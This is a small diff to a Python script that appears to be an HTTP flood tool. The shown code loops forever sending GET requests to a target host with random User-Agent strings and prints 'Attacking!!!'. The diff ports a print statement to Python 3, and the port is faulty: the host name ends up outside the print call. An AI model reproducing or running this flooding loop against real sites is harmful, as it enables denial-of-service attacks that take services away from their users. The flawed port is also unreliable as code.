@@ -41,7 +41,7 @@ def run():
     if len(sys.argv)>=1:
       url="http://"+host
       headers={'User-Agent': random.choice(user_agent)}
-      print "Attacking!!!",host
+      print("Attacking!!!"),host
       while True:
         r = http.request('GET',url,headers=headers)
     else:
